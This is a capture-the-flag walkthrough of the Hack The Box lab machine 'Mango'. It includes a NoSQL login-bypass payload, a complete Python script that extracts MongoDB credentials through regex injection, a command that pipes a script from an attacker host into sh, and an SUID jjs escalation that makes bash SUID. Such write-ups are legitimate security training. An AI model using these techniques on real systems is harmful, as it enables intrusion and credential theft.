---
title: '(Updated) HTB Mango - Medium'
date: 2024-08-10 00:00:00 +0000
categories: [HTB Machines]
tags: [Medium, Linux, HTB]
---

**Mango** is a medium HTB machine that requires you to discover a hidden subdomain by **inspecting the SSL/TLS certificate**. The discovered subdomain is **vulnerable to NoSQL injection**, allowing you to exfiltrate credentials from the MongoDB database. Root-level access to the machine is achievable by **abusing an SUID binary**.

**Author’s note**: I published a walkthrough for this machine 3 months ago. However, I decided to create a new one, sharing a much better and more efficient code to exfiltrate information from the database. To be honest, the Senior Web Pentester Path from HTB Academy is really motivating me to write all kinds of scripts to perform blind exfiltration, and I couldn’t resist from exploiting this machine one more time. Happy hacking! :D

<img src="/assets/img/mango-updated/image.png" alt="image.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan using [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 nmap4lazy.py -t 10.129.229.185

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.229.185 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 80, 443

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.229.185 -sVC -p22,80,443

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-10 04:20 CDT
Nmap scan report for 10.129.229.185
Host is up (0.0077s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
|_http-title: Mango | Search Base
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
Service Info: Host: 10.129.229.185; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds

[+] Script finished successfully
```

Appended the newly discovered domain to */etc/hosts*.

```bash
echo -e "10.129.229.185\tmango.htb" | sudo tee -a /etc/hosts
10.129.229.185	mango.htb
```

Accessing the web application returns a *403 Forbidden* status code ;-;

<img src="/assets/img/mango-updated/image 1.png" alt="image 1.png" style="width:800px;">

There is a browsing feature on port TCP/443. It is not vulnerable to NoSQL injection :(

<img src="/assets/img/mango-updated/image 2.png" alt="image 2.png" style="width:800px;">

Discovered a hidden subdomain from the SSL/TLS certificate.

<img src="/assets/img/mango-updated/image 3.png" alt="image 3.png" style="width:800px;">

Updated the */etc/hosts* file.

```bash
sed '$d' /etc/hosts | sudo sponge /etc/hosts

echo -e "10.129.229.185\tmango.htb staging-order.mango.htb" | sudo tee -a /etc/hosts
10.129.229.185	mango.htb staging-order.mango.htb
```

Thanks god, something to have fun.

<img src="/assets/img/mango-updated/image 4.png" alt="image 4.png" style="width:800px;">

# Exploitation

Moved to Burp. The server returns a *200 OK* when the credentials are invalid.

<img src="/assets/img/mango-updated/image 5.png" alt="image 5.png" style="width:800px;">

Successfully bypassed the authentication by using URL-encoded query operands. According to my CWEE notes, string casting and input validation will easily prevent this attack.

```bash
username[$lt]=~&password[$lt]=~&login=login
```

<img src="/assets/img/mango-updated/image 6.png" alt="image 6.png" style="width:800px;">

Opened the response in the browser.

<img src="/assets/img/mango-updated/image 7.png" alt="image 7.png" style="width:800px;">

Nothing here. Let’s try something different.

<img src="/assets/img/mango-updated/image 8.png" alt="image 8.png" style="width:800px;">

Created a Python script to exfiltrate the data from the MongoDB database.

```python
#!/usr/bin/env python3

# Author: duskb1t

import argparse
import requests
import string
import sys
from pwn import *
from termcolor import colored

def exploit(target, user=None):
    if user:
        print() # line break
        log.info(colored(f'Exfiltrating ', 'blue') + colored(user, 'cyan') + colored('\'s password...', 'blue'))

    exfiltrated_list = []
    working_list = ['']
    chars = string.ascii_letters + string.digits + '!"#%\'()+,-/:;<=>@[]_`{}~ '
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'staging-order.mango.htb'
    }
    url = 'http://staging-order.mango.htb/'
    wildcard = 1

    brute_status = log.progress(colored('Brute-force status', 'blue'))

    while True:
        for c in chars:
            if user:
                data = 'username={}&password[$regex]=^{}{}.*&login=login'.format(user, working_list[0], c)
            else:
                data = 'username[$regex]=^{}{}.*&password[$lt]=~&login=login'.format(working_list[0], c)
            brute_status.status(colored(data, 'cyan'))
            r = requests.post(url, headers=headers, data=data, allow_redirects=False)
            if r.status_code == 302:
                working_list.append(f'{working_list[0]}{c}')
                wildcard = 1337

        else:
            if wildcard == 1:
                exfiltrated_list.append(working_list[0])
                log.info(colored('Dumped: ', 'blue') + colored(working_list[0], 'cyan'))
            else:
                wildcard = 1

            del working_list[0]
            if not working_list:
                brute_status.success(colored('completed!', 'light_green'))
                return exfiltrated_list
            
def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB Mango Exfiltrator =)"
    )
    parser.add_argument('-t', '--target', dest='target', required=True)
    return parser.parse_args()

def main():
    try:
        args = set_arguments()
        target = args.target

        print()
        users = exploit(target)
        for user in users:
            exploit(target, user)
        sys.exit(0)

    except KeyboardInterrupt:
        print(colored('\n[!] Keyboard interrumpt detected. Quitting!', 'yellow', attrs=['bold']))
        sys.exit(1)

main()
```

It worked! We now have some credentials to play with.

<img src="/assets/img/mango-updated/image 9.png" alt="image 9.png" style="width:800px;">

*Hydra* confirmed that the credentials are valid for the *SSH* server.

<img src="/assets/img/mango-updated/image 10.png" alt="image 10.png" style="width:800px;">

Successfully connected over *SSH* as *mango*.

```bash
ssh mango@10.129.229.185
```

<img src="/assets/img/mango-updated/image 11.png" alt="image 11.png" style="width:800px;">

# Lateral Movement

There is another user called *admin*.

```bash
mango@mango:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
mango:x:1000:1000:mango:/home/mango:/bin/bash
admin:x:4000000000:1001:,,,:/home/admin/:/bin/sh
```

Successfully moved to admin with the exfiltrated credentials.

```bash
mango@mango:~$ su - admin
```

<img src="/assets/img/mango-updated/image 12.png" alt="image 12.png" style="width:800px;">

Now, the user’s flag is readable. Good job!

<img src="/assets/img/mango-updated/image 13.png" alt="image 13.png" style="width:800px;">

# PrivEsc

Executed [LinPEAS](https://github.com/peass-ng/PEASS-ng/releases/download/20240804-31b931f7/linpeas.sh) on the target. Discovered potential ways to escalate privileges.

```bash
admin@mango:/home/admin$ curl 10.10.14.23:8000/linpeas.sh | sh
```

<img src="/assets/img/mango-updated/image 14.png" alt="image 14.png" style="width:800px;">

<img src="/assets/img/mango-updated/image 15.png" alt="image 15.png" style="width:800px;">

[GTFOBins](https://gtfobins.github.io/gtfobins/jjs/) has a *Proof of Concept (PoC)* for that binary.

<img src="/assets/img/mango-updated/image 16.png" alt="image 16.png" style="width:800px;">

Successfully escalated to root by abusing the SUID binary. GGs!!!

```bash
admin@mango:/home/admin$ install -m =xs $(which jjs) .
admin@mango:/home/admin$ echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod +s /bin/bash').waitFor()" | /usr/bin/jjs

admin@mango:/home/admin$ bash -p
```

<img src="/assets/img/mango-updated/image 17.png" alt="image 17.png" style="width:800px;">
